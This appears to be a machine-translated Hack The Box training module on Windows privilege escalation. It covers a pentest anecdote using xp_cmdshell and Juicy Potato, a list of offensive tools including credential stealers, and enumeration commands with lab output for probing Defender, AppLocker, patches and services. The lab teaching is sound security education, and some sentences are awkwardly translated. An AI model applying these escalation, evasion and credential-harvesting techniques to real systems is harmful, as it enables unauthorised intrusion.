<p><strong>Scenario 3 - Obtaining credentials and abusing account privileges</strong> In the final scenario, I was placed in a fairly closed network with the goal of accessing a critical database server. The client provided me with a laptop with a standard domain user account on which I could load tools. Finally, I ran<a href="https://github.com/SnaffCon/Snaffler" rel="noreferrer" target="_blank">Snaffler</a>Tools to search file shares for sensitive information. i found some <code>.sql</code> The file contained low-privilege database credentials pointing to a database on one of their database servers. I use a local MSSQL client, connect to the database via database credentials, enable<a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" rel="noreferrer" target="_blank">xp_cmdshell</a>Store the procedure and obtain local command execution permissions. With this service account access, I confirm that I have<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" rel="noreferrer" target="_blank">SeImpersonatePrivilege</a>permissions, which can be used for local privilege escalation. I downloaded a custom compiled version<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">Juicy Potato</a>Go to the host to assist with privilege escalation and successfully add the local administrator user. Adding the user doesn't work well, but my attempts to get the beacon/reverse shell failed. This access gave me remote access to the database host and full control of the database for one of the company's customers.</p>
<p><strong>Connect via FreeRDP</strong> We can connect via the command line using the command <code>xfreerdp /v:&lt;target ip&gt; /u:htb-student</code> and enter the provided password at the prompt. Most sections provide user credentials <code>htb-student</code>, but some sections (depending on the content) will require you to use a different user for the RDP connection and provide alternate credentials.</p>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$  xfreerdp /v:10.129.43.36 /u:htb-student

[21:17:27:323] [28158:28159] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[21:17:27:323] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[21:17:27:324] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[21:17:27:324] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[21:17:27:648] [28158:28159] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[21:17:27:672] [28158:28159] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[21:17:27:672] [28158:28159] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[21:17:28:770] [28158:28159] [INFO][com.freerdp.crypto] - creating directory /home/user2/.config/freerdp
[21:17:28:770] [28158:28159] [INFO][com.freerdp.crypto] - creating directory [/home/user2/.config/freerdp/certs]
[21:17:28:771] [28158:28159] [INFO][com.freerdp.crypto] - created directory [/home/user2/.config/freerdp/server]
[21:17:28:794] [28158:28159] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:17:28:794] [28158:28159] [WARN][com.freerdp.crypto] - CN = WINLPE-SKILLS1-SRV
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.43.36:3389) 
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - 	WINLPE-SKILLS1-SRV
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.43.36:3389 (RDP-Server):
	Common Name: WINLPE-SKILLS1-SRV
	Subject:     CN = WINLPE-SKILLS1-SRV
	Issuer:      CN = WINLPE-SKILLS1-SRV
	Thumbprint:  9f:f0:dd:28:f5:6f:83:db:5e:8c:5a:e9:5f:50:a4:50:2d:b3:e7:a7:af:f4:4a:8a:1a:08:f3:cb:46:c3:c3:e8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
Password: </code></pre>
<p>Many parts of the module require tooling such as open source scripts, precompiled binaries, and exploit PoCs. If applicable, these tools can be found in <code>C:\Tools</code> directory on the target host. Although most of the tools are provided, you can also challenge yourself and try to upload a file to the target host (using the techniques demonstrated in the file transfer module), or even use<a href="https://visualstudio.microsoft.com/downloads/" rel="noreferrer" target="_blank">Visual Studio</a>Compile some tools yourself.</p>
<p><strong>Useful Tools</strong></p>
<div class="post-table-wrap"><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/GhostPack/Seatbelt" rel="noreferrer" target="_blank">Seatbelt</a></td><td>C# project for performing various local privilege escalation checks</td></tr><tr><td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" rel="noreferrer" target="_blank">winPEAS</a></td><td>is a script that searches a Windows host for possible privilege escalation paths. Instructions for all inspections are as follows:</td></tr><tr><td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" rel="noreferrer" target="_blank">PowerUp</a></td><td>PowerShell script to find common Windows privilege escalation vectors that rely on misconfiguration. It can also be used to exploit problems that have been discovered.</td></tr><tr><td><a href="https://github.com/GhostPack/SharpUp" rel="noreferrer" target="_blank">SharpUp</a></td><td>C# version of PowerUp</td></tr><tr><td><a href="https://github.com/411Hall/JAWS" rel="noreferrer" target="_blank">JAWS</a></td><td>PowerShell script written in PowerShell 2.0 to enumerate privilege escalation vectors</td></tr><tr><td><a href="https://github.com/Arvanaghi/SessionGopher" rel="noreferrer" target="_blank">SessionGopher</a></td><td>is a PowerShell tool that finds and decrypts session information saved by remote access tools. It can extract session information saved by PuTTY, WinSCP, SuperPuTTY, FileZilla and RDP.</td></tr><tr><td><a href="https://github.com/rasta-mouse/Watson" rel="noreferrer" target="_blank">Watson</a></td><td>is a. NET tool designed to enumerate missing KBs and suggest exploits of privilege escalation vulnerabilities.</td></tr><tr><td><a href="https://github.com/AlessandroZ/LaZagne" rel="noreferrer" target="_blank">LaZagne</a></td><td>Tool for retrieving passwords stored on your local computer from web browsers, chat tools, databases, Git, email, memory dumps, PHP, system administration tools, wireless network configurations, internal Windows password storage mechanisms, and more</td></tr><tr><td><a href="https://github.com/bitsadmin/wesng" rel="noreferrer" target="_blank">Windows Exploit Suggester - Next Generation</a></td><td>is a tool based on the output of a Windows utility <code>systeminfo</code>, which provides a list of vulnerabilities to which the operating system is vulnerable, along with any exploits for those vulnerabilities. It supports all Windows operating systems from Windows XP to Windows 10, including their corresponding Windows Server versions.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" rel="noreferrer" target="_blank">Sysinternals Suite</a></td><td>We'll use several tools from Sysinternals in our enumerations, including<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noreferrer" target="_blank">AccessChk</a>、<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist" rel="noreferrer" target="_blank">PipeList</a>and<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" rel="noreferrer" target="_blank">PsService</a></td></tr></tbody></table></div>
<h2>Situational awareness and environmental mapping</h2>
<h3>situational awareness</h3>
<p>No matter what situation you are in, whether it is in daily life or in a project such as network penetration testing, it is crucial to always grasp your position in time and space.</p>
<p>Gathering network information is a key part of our enumeration. We might discover that a host is dual-homed, and compromising that host might allow us to move laterally to another part of the network that was previously inaccessible. Dual-homing means that the host or server belongs to two or more different networks and in most cases has multiple virtual or physical network interfaces. We should always look at the routing table to see information about the local network and its surrounding networks. We may also collect information about the local domain (if the host is part of an Active Directory environment), including the IP address of the domain controller. It is also important to use the arp command to view the ARP cache for each interface and to see what other hosts the host has communicated with recently. This helps us with lateral movement after obtaining credentials. It gives a good indication of which hosts the administrator is connecting to from that host via RDP or WinRM.</p>
<ol><li><strong>Network information</strong></li></ol>
<p>This network information may directly or indirectly help us enhance local permissions. It might lead us through another path to a system that would allow us to gain access or escalate privileges, or it might leak information that we could use to move laterally to gain further access after elevating privileges on the current system.</p>
<p><strong>Interface, IP address, DNS information</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; ipconfig /all</code></pre>
<p><strong>ARP table</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; arp -a</code></pre>
<p><strong>routing table</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; route print</code></pre>
<p>Enumerating existing protections will help us ensure that the methods used are not blocked or detected, and will also help us if we have to write a custom payload or modify it before compiling the tool.</p>
<ol><li><strong>Enumeration protection measures</strong></li></ol>
<p>Many organizations use some kind of application whitelisting solution to control which types of applications and files certain users can run. This may be used to try to prevent non-admin users from running <code>cmd.exe</code> its <code>PowerShell.exe</code> Other binaries and file types not required for daily work. A common solution provided by Microsoft is<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview" rel="noreferrer" target="_blank">AppLocker</a>. we can use<a href="https://docs.microsoft.com/en-us/PowerShell/module/applocker/get-applockerpolicy?view=windowsserver2019-ps" rel="noreferrer" target="_blank">GetAppLockerPolicy</a> The cmdlet enumerates local, effective (enforcement), and domain AppLocker policies. This will help us understand which binaries or file types may be blocked and whether we need to perform some kind of AppLocker bypass during the enumeration process or before running a tool or technique to escalate privileges.</p>
<ul><li>Check Windows Defender status</li></ul>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-MpComputerStatus

AMEngineVersion: 1.1.17900.7
AMProductVersion: 4.10.14393.2248
AMServiceEnabled: True
AMServiceVersion: 4.10.14393.2248
AntispywareEnabled: True
AntispywareSignatureAge: 1
AntispywareSignatureLastUpdated: 3/28/2021 2:59:13 AM
AntispywareSignatureVersion: 1.333.1470.0
AntivirusEnabled: True
AntivirusSignatureAge: 1
AntivirusSignatureLastUpdated: 3/28/2021 2:59:12 AM
AntivirusSignatureVersion: 1.333.1470.0
BehaviorMonitorEnabled: False
ComputerID: 54AF7DE4-3C7E-4DA0-87AC-831B045B9063
ComputerState: 0
FullScanAge: 4294967295
FullScanEndTime:
FullScanStartTime:
IoavProtectionEnabled: False
LastFullScanSource: 0
LastQuickScanSource: 0
NISEnabled: False
NISEngineVersion: 0.0.0.0
NISSignatureAge: 4294967295
NISSignatureLastUpdated:
NISSignatureVersion: 0.0.0.0
OnAccessProtectionEnabled: False
QuickScanAge: 4294967295
QuickScanEndTime:
QuickScanStartTime:
RealTimeProtectionEnabled: False
RealTimeScanDirection: 0
PSComputerName:</code></pre>
<ul><li>List AppLocker rules</li></ul>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PublisherConditions: {*\*\*,0.0.0.0-*}
PublisherExceptions: {}
PathExceptions: {}
HashExceptions: {}
Id: a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name: (Default Rule) All signed packaged apps
Description: Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid: S-1-1-0
Action: Allow

PathConditions: {%PROGRAMFILES%\*}
PathExceptions: {}
PublisherExceptions: {}
HashExceptions: {}
Id: 921cc481-6e17-4653-8f75-050b80acca20
Name: (Default Rule) All files located in the Program Files folder
Description: Allows members of the Everyone group to run applications that are located in the Program Files
                      folder.
UserOrGroupSid: S-1-1-0
Action: Allow

PathConditions: {%WINDIR%\*}
PathExceptions: {}
PublisherExceptions: {}
HashExceptions: {}
Id: a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name: (Default Rule) All files located in the Windows folder
Description: Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid: S-1-1-0
Action: Allow

PathConditions: {*}
PathExceptions: {}
PublisherExceptions: {}
HashExceptions: {}
Id: fd686d83-a829-4351-8ff4-27c7de5755d2
Name: (Default Rule) All files
Description: Allows members of the local Administrators group to run all applications.
UserOrGroupSid: S-1-5-32-544
Action: Allow

PublisherConditions: {*\*\*,0.0.0.0-*}
PublisherExceptions: {}
PathExceptions: {}
HashExceptions: {}
Id: b7af7102-efde-4369-8a89-7a6a392d1473
Name: (Default Rule) All digitally signed Windows Installer files
Description: Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid: S-1-1-0
Action: Allow

PathConditions: {%WINDIR%\Installer\*}
PathExceptions: {}
PublisherExceptions: {}
HashExceptions: {}
Id: 5b290184-345a-4453-b184-45305f6d9a54
Name: (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description: Allows members of the Everyone group to run all Windows Installer files located in
                      %systemdrive%\Windows\Installer.
UserOrGroupSid: S-1-1-0
Action: Allow

PathConditions: {*.*}
PathExceptions: {}
PublisherExceptions: {}
HashExceptions: {}
Id: 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name: (Default Rule) All Windows Installer files
Description: Allows members of the local Administrators group to run all Windows Installer files.
UserOrGroupSid: S-1-5-32-544
Action: Allow

PathConditions: {%PROGRAMFILES%\*}
PathExceptions: {}
PublisherExceptions: {}
HashExceptions: {}
Id: 06dce67b-934c-454f-a263-2515c8796a5d
Name: (Default Rule) All scripts located in the Program Files folder
Description: Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid: S-1-1-0
Action: Allow

PathConditions: {%WINDIR%\*}
PathExceptions: {}
PublisherExceptions: {}
HashExceptions: {}
Id: 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name: (Default Rule) All scripts located in the Windows folder
Description: Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid: S-1-1-0
Action: Allow

PathConditions: {*}
PathExceptions: {}
PublisherExceptions: {}
HashExceptions: {}
Id: ed97d0cb-15ff-430f-b82c-8d7832957725
Name: (Default Rule) All scripts
Description: Allows members of the local Administrators group to run all scripts.
UserOrGroupSid: S-1-5-32-544
Action: Allow</code></pre>
<ul><li>Test AppLocker policies</li></ul>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

FilePath                    PolicyDecision MatchingRule
--------                    -------------- ------------
C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe


PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\*\*\*\*.exe -User Everyone
PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell_ise.exe -User Everyone
</code></pre>
<h3>initial enumeration</h3>
<p>During the evaluation, we may obtain a low-privilege shell on the Windows host (whether domain-joined or not) that requires privilege escalation for further access. Fully compromising the host could potentially give us access to sensitive files/file shares, gain the ability to capture traffic to obtain more credentials, or gain credentials that can help further escalate access, or even directly escalate to Domain Administrator privileges in an Active Directory environment. Depending on the system configuration and the type of data encountered, we can escalate privileges to one of the following:</p>
<ul><li>highly privileged <code>NT AUTHORITY\SYSTEM</code> account, or<a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" rel="noreferrer" target="_blank">LocalSystem</a> account, which is a highly privileged account that has more permissions than the local administrator account and is used to run most Windows services.</li><li>built-in local <code>administrator</code> account. Some organizations disable the account, but many do not. In a client environment, it is not uncommon for this account to be reused across multiple systems.</li><li>Another local account, which is local <code>administrator</code> members of the group. Any account in this group will have the same <code>administrator</code> Account has the same permissions.</li><li>A standard (non-privileged) domain user, belonging to the local <code>administrator</code> group.</li><li>A domain administrator (highly privileged in an Active Directory environment), belonging to the local <code>Administrators group</code>.</li></ul>
<p><strong>key data points</strong></p>
<ul><li><code>OS name</code> <code>system name</code>: Knowing the type (workstation or server) and level of Windows operating system (Windows 7 or 10, Server 2008, 2012, 2016, 2019, etc.) can give us an idea of the types of tools that may be available in legacy systems (e.g.<code>PowerShell</code> version), or if these tools are lacking. This also identifies operating system versions where public exploits may exist.</li><li><code>Version</code>: Similar to operating system versions, there may be public exploits for specific Windows version vulnerabilities. Windows system vulnerabilities can cause system instability or even complete system crashes. Be careful when running these programs on any production system and make sure you fully understand the vulnerability and its possible consequences before running it.</li><li><code>Running Services</code> <code>running services</code>: It is important to understand the services running on the host, especially those that start with <code>NT AUTHORITY\SYSTEM</code> Or a service run by an administrator-level account. A misconfigured or vulnerable service running in a privileged account is often an easy advantage for privilege escalation.</li></ul>
<h4>System information</h4>
<p>Looking at the system itself can give us a better idea of the specific operating system version, hardware used, installed programs and security updates. This will help us narrow down the search for missing patches and related CVEs in order to escalate privileges. Use<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist" rel="noreferrer" target="_blank">Tasklist</a>Command to view running processes can give us a better understanding of the applications currently running on the system.</p>
<pre><code class="language-cmd">Tasklist</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
smss.exe                       316 N/A
csrss.exe                      424 N/A
wininit.exe                    528 N/A
csrss.exe                      540 N/A
winlogon.exe                   612 N/A
services.exe                   664 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 BrokerInfrastructure, DcomLaunch, LSM,
                                   PlugPlay, Power, SystemEventsBroker
svchost.exe                    836 RpcEptMapper, RpcSs
LogonUI.exe                    952 N/A
dwm.exe                        964 N/A
svchost.exe                    972 TermService
svchost.exe                   1008 Dhcp, EventLog, lmhosts, TimeBrokerSvc
svchost.exe                    364 NcbService, PcaSvc, ScDeviceEnum, TrkWks,
                                   UALSVC, UmRdpService
&lt;...SNIP...&gt;

svchost.exe                   1468 Wcmsvc
svchost.exe                   1804 PolicyAgent
spoolsv.exe                   1884 Spooler
svchost.exe                   1988 W3SVC, WAS
svchost.exe                   1996 ftpsvc
svchost.exe                   2004 AppHostSvc
FileZilla Server.exe          1140 FileZilla Server
inetinfo.exe                  1164 IISADMIN
svchost.exe                   1736 DiagTrack
svchost.exe                   2084 StateRepository, tiledatamodelsvc
VGAuthService.exe             2100 VGAuthService
vmtoolsd.exe                  2112 VMTools
MsMpEng.exe                   2136 WinDefend

&lt;...SNIP...&gt;

FileZilla Server Interfac     5628 N/A
jusched.exe                   5796 N/A
cmd.exe                       4132 N/A
conhost.exe                   4136 N/A
TrustedInstaller.exe          1120 TrustedInstaller
TiWorker.exe                  1816 N/A
WmiApSrv.exe                  2428 wmiApSrv
tasklist.exe                  3596 N/A</code></pre>
<p>Familiarity with standard Windows processes such as the Session Manager Subsystem (smss.exe), Client Server Runtime Subsystem (csrss.exe),<a href="https://en.wikipedia.org/wiki/Winlogon" rel="noreferrer" target="_blank">WinLogon (winlogon.exe)、</a> Local Security Authority Subsystem Service (LSASS) and Service Host (svchost.exe), among others, and their related services, are critical. Being able to quickly identify standard processes/services will help speed up our enumeration and allow us to focus on non-standard processes/services, potentially opening a path to privilege escalation. In the above example, we are most interested in <code>FileZilla</code> FTP server operation and try to enumerate versions to find open vulnerabilities or misconfigurations, such as FTP anonymous access, that could lead to exposure of sensitive data and more.</p>
<p>Other processes, such as <code>MsMpEng.exe</code>, Windows Defender, are also interesting because they help us plan the protection measures that may need to be circumvented or bypassed on the target host.</p>
<p><strong>Show all environment variables</strong> Environment variables explain a lot about host configuration. To print them, Windows provides <code>set</code> command.<code>PATH</code> is one of the most commonly overlooked variables. In the output below, there are no exceptions. However, the administrator (or application) modifies <code>PATH</code> The situation is not uncommon. A common example is to put Python or Java in the path so that Python or. JAR files. DLL injection into other applications may be possible if the folders placed in the PATH are user-writable. Remember, when you run a program, Windows first looks for the program in CWD (the current working directory) and then in PATH from left to right. This means that if a custom path is placed on the left (before C:\Windows\System32), it is much more dangerous than on the right.</p>
<p>In addition to PATH,<code>set</code> Other useful information can also be provided, such as HOME DRIVE. In an enterprise, this is usually file sharing. Going directly to the file sharing page may display other accessible directories. It is not uncommon to have access to the "IT Catalog" which contains inventory tables containing passwords. Additionally, sharing is used for home directories so users can log into other computers and have the same experience/files/desktop, etc. (Roaming Profiles). It could also mean the user is carrying something malicious. If the file is placed in <code>USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup</code>, this file will be executed when the user logs into another machine.</p>
<pre><code class="language-cmd-session">C:\htb&gt; set

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Administrator\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=WINLPE-SRV01
ComSpec=C:\Windows\system32\cmd.exe
HOMEDRIVE=C:
HOMEPATH=\Users\Administrator
LOCALAPPDATA=C:\Users\Administrator\AppData\Local
LOGONSERVER=\\WINLPE-SRV01
NUMBER_OF_PROCESSORS=6
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=3100
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
TMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
USERDOMAIN=WINLPE-SRV01
USERDOMAIN_ROAMINGPROFILE=WINLPE-SRV01
USERNAME=Administrator
USERPROFILE=C:\Users\Administrator
windir=C:\Windows </code></pre>
<p><strong>View detailed configuration information</strong> <code>systeminfo</code> The command will show whether the device has been recently patched and whether it is a virtual machine. If the device has not been patched recently, gaining administrator-level access may be as simple as running a known exploit. Google the knowledge base installed under Hotfix to know when the box has been patched. This information is not always present because hotfix software can be hidden from non-administrators. You can also view <code>system boot time</code> and <code>operating system version</code>, to understand the patch level. If the box hasn't been rebooted in more than six months, it probably hasn't been patched either.</p>
<p>Additionally, many guides will say that network information is important because it may indicate that the machine is dual-homed (connected to multiple networks). Typically for enterprises, devices are given access to other networks through firewall rules, without a physical cable connection.</p>
<pre><code class="language-cmd-session">C:\htb&gt; systeminfo

Host Name:                 WINLPE-SRV01
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00376-30000-00299-AA303
Original Install Date:     3/24/2021, 3:46:32 PM
System Boot Time:          3/25/2021, 9:24:36 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              3 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [03]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
Total Physical Memory:     6,143 MB
Available Physical Memory: 3,474 MB
Virtual Memory: Max Size:  10,371 MB
Virtual Memory: Available: 7,544 MB
Virtual Memory: In Use:    2,827 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WINLPE-SRV01
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB5001078
                           [03]: KB4103723
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.43.8
                                 [02]: fe80::e4db:5ea3:2775:8d4d
                                 [03]: dead:beef::e4db:5ea3:2775:8d4d
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.20.56
                                 [02]: fe80::f055:fefd:b1b:9919
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</code></pre>
<p><strong>Patches and updates</strong> if <code>systeminfo</code> The hot fix does not show up, it can be done via<a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page" rel="noreferrer" target="_blank">WMI-Command</a> Binaries and QFE (Quick Fix Engineering) to query for patches.</p>
<pre><code class="language-cmd-session">C:\htb&gt; wmic qfe

Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=3199986  WINLPE-SRV01  Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016
https://support.microsoft.com/help/5001078  WINLPE-SRV01  Security Update               KB5001078               NT AUTHORITY\SYSTEM  3/25/2021
http://support.microsoft.com/?kbid=4103723  WINLPE-SRV01  Security Update               KB4103723               NT AUTHORITY\SYSTEM  3/25/2021</code></pre>
<p>We can also achieve this using PowerShell via the Get-Hotfix cmdlet.</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-HotFix | ft -AutoSize

Source       Description     HotFixID  InstalledBy                InstalledOn
------       -----------     --------  -----------                -----------
WINLPE-SRV01 Update          KB3199986 NT AUTHORITY\SYSTEM        11/21/2016 12:00:00 AM
WINLPE-SRV01 Update          KB4054590 WINLPE-SRV01\Administrator 3/30/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB5001078 NT AUTHORITY\SYSTEM        3/25/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB3200970 WINLPE-SRV01\Administrator 4/13/2021 12:00:00 AM</code></pre>
<p><strong>Installed programs</strong> WMI can also be used to display installed software. This information can often lead us to hard-to-find vulnerabilities.<code>FileZilla</code>/<code>Putty</code> Waiting for installation? run <code>LaZagne</code> Check whether the credentials stored by these apps are installed. Additionally, some programs may be installed and run as vulnerable services.</p>
<pre><code class="language-cmd-session">C:\htb&gt; wmic product get name

Name
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127
Java 8 Update 231 (64-bit)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
Java Auto Updater

&lt;SNIP&gt;</code></pre>
<p>Of course, we can also achieve this with PowerShell using the Get-WmiObject cmdlet.</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-WmiObject -Class Win32_Product |  select Name, Version

Name                                                                    Version
----                                                                    -------
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
Microsoft OLE DB Driver for SQL Server                                  18.3.0.0
Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219             10.0.40219
Microsoft Help Viewer 2.3                                               2.3.28107
Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219             10.0.40219
Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005              12.0.21005
Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005           12.0.21005
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29914          14.28.29914
Microsoft ODBC Driver 13 for SQL Server                                 13.2.5026.0
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
SQL Server 2016 Database Engine Services                                13.2.5026.0
SQL Server Management Studio for Reporting Services                     15.0.18369.0
Microsoft SQL Server 2008 Setup Support Files                           10.3.5500.0
SSMS Post Install Tasks                                                 15.0.18369.0
Microsoft VSS Writer for SQL Server 2016                                13.2.5026.0
Java 8 Update 231 (64-bit)                                              8.0.2310.11
Browser for SQL Server 2016                                             13.2.5026.0
Integration Services                                                    15.0.2000.130

&lt;SNIP&gt;</code></pre>
<p><strong>Show running processes</strong> <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat" rel="noreferrer" target="_blank">netstat</a> The command displays current TCP and UDP connections, which gives us a better idea of which services are listening on local and externally accessible ports. We may find a vulnerable service that is only accessible to localhost (when logged into the host) and exploit it to escalate privileges.</p>
<pre><code class="language-cmd-session">PS C:\htb&gt; netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1096
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       840
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3520
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       968
&lt;...SNIP...&gt;

netstat -ano | findstr:8080

